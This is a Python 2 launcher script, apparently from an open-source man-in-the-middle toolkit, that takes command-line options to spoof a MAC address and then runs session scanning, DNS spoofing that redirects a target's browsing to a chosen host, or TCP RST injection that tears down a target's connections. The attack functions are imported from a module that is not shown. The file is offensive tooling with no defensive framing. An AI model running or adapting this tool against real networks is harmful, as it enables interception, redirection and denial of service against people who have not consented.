#!/bin/python

# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import os
import random
import optparse
import core.config
from core.utils import *
from core.mitm import *

def parse_arguments():
	""" parse arguments """
	parser = optparse.OptionParser('Usage: %prog [options] dev')
	parser.add_option('-1', '--sessions-scan', action = 'store_const', const = 1, dest = 'mode', help = 'Sessions scan mode')
	parser.add_option('-2', '--dns-spoof', action = 'store_const', const = 2, dest = 'mode', help = 'Dns spoofing')
	parser.add_option('-x', '--spoof', action = 'store_const', const = 1, dest = 'spoof', help = 'Spoof mode, generate a fake MAC address to be used during attack')
	parser.add_option('-m', dest = 'macaddr', help = 'Mac address octet prefix (could be an entire MAC address in the form AA:BB:CC:DD:EE:FF)')
	parser.add_option('-M', dest = 'manufacturer', help = 'Manufacturer of the wireless device, for retrieving a manufactur based prefix for MAC spoof')
	parser.add_option('-s', dest = 'source', help = 'Source ip address (e.g. a class C address like 192.168.1.150) usually the router address')
	parser.add_option('-t', dest = 'target', help = 'Target ip address (e.g. a class C address like 192.168.1.150)')
	parser.add_option('-p', dest = 'port', help = 'Target port to shutdown')
	parser.add_option('-a', dest = 'host', help = 'Target host that will be redirect while navigating on target machine')
	parser.add_option('-r', dest = 'redir', help = 'Target redirection that will be fetched instead of host on the target machine')
	parser.add_option('-v', '--verbose', action = 'store_const', const = 1, dest = 'verbosity', help = 'Verbose output mode')
	parser.add_option('-d', '--dotted', action = 'store_const', const = 1, dest = 'dotted', help = 'Dotted output mode')
	return parser.parse_args()

# check privileges (low level socket and pcap require root)
if not os.geteuid() == 0:
	sys.exit('You must be root.')

(options, args) = parse_arguments()

print ""

if len(args) != 1:
	print sys.argv[0] + ' -h for help'
	print '[!] Must specify interface'
	exit()

mac_addr = ""
original_mac_addr = get_mac_addr(args[0])
changed = False

if not options.source:
	try:
		options.source = get_default_gateway_linux()
	except:
		print "[!] Unable to retrieve default gateway, please specify one using -s option"
		sys.exit(2)

if not options.target:
	print '[!] Must specify target address'
	exit()

if options.verbosity == 1:
	core.config.verbose = True

if options.dotted == 1:
	core.config.dotted = True

if options.spoof == 1:
	if not options.macaddr and not options.manufacturer:
		decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
		if decision == 'y':
			mac_addr = fake_mac_address([], 1)
			try:
				change_mac(args[0], mac_addr)
				changed = True
			except:
				pass
		else:
			mac_addr = original_mac_addr

	elif options.macaddr and not options.manufacturer:
		if parse_mac(options.macaddr) != parse_mac(original_mac_addr):
			mac_addr = fake_mac_address(mac_to_hex(options.macaddr))
			decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
			if decision == 'y':
				try:
					change_mac(args[0], mac_addr)
					changed = True
				except:
					pass
			else:
				mac_addr = original_mac_addr

		else:
			mac_addr = options.macaddr

	elif options.manufacturer:
		macs = get_manufacturer(options.manufacturer)
		mac_addr = fake_mac_address(mac_to_hex(random.choice(macs)))
		decision = raw_input('[+] In order to change MAC address ' + G + args[0] + W + ' must be temporary put down. Proceed?[y/n] ')
		if decision == 'y':
			try:
				change_mac(args[0], mac_addr)
				changed = True
			except:
				pass
		else:
			mac_addr = original_mac_addr

	print "[+] Waiting for wireless reactivation.."
	if options.mode == 2:
		time.sleep(10)
	else:
		time.sleep(4)

else:
	if not options.macaddr:
		mac_addr = original_mac_addr
	else:
		mac_addr = options.macaddr

print "[+] Using " + G + mac_addr + W + " MAC address"
print "[+] Set " + G + options.source + W + " as default gateway"

if options.mode == 1:
	get_sessions(args[0], options.target)

elif options.mode == 2:
	dns_spoof(args[0], parse_mac(mac_addr), options.source, options.target, options.host, options.redir)

else:
	if options.port:
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target, options.port)
	else:
		rst_inject(args[0], parse_mac(mac_addr), options.source, options.target)
if changed == True:
	try:
		time.sleep(1)
		print "[+] Resetting MAC address to original value " + G + original_mac_addr + W + " for device " + G + args[0] + W
		change_mac(args[0], original_mac_addr)
	except:
		pass

